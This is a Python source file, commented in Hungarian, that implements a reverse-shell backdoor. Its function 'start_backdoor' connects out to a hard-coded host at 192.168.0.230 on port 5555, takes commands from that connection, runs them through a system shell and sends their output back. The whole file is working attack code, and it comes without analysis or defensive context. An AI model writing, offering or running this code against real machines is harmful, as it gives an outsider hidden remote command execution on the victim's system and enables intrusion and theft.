from socket import * # Mindent behozunk a "napi használatba"
import subprocess
import os

# --- KONFIGURÁCIÓ ---
SERVER_IP = "192.168.0.230" 
PORT = 5555

def start_backdoor():
    
    try:
        s = socket(AF_INET, SOCK_STREAM) 
        s.connect((SERVER_IP, PORT))
    except Exception:
        return

    while True:
        try:
            command = s.recv(1024).decode()

            if command.lower() == "exit":
                break
            
            if command.startswith("cd "):
                try:
                    target_dir = command[3:].strip()
                    os.chdir(target_dir)
                    result = f"Mappa váltva: {os.getcwd()}"
                except FileNotFoundError:
                    result = "Hiba: A mappa nem található."
            else:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output, error = proc.communicate()
                # Decoding a Linux/Windows kompatibilitás miatt
                result = output.decode('utf-8', errors='replace') + error.decode('utf-8', errors='replace')

            if not result:
                result = "[OK]"
                
            s.send(result.encode())
            
        except Exception:
            break

    s.close()

if __name__ == "__main__":
    start_backdoor()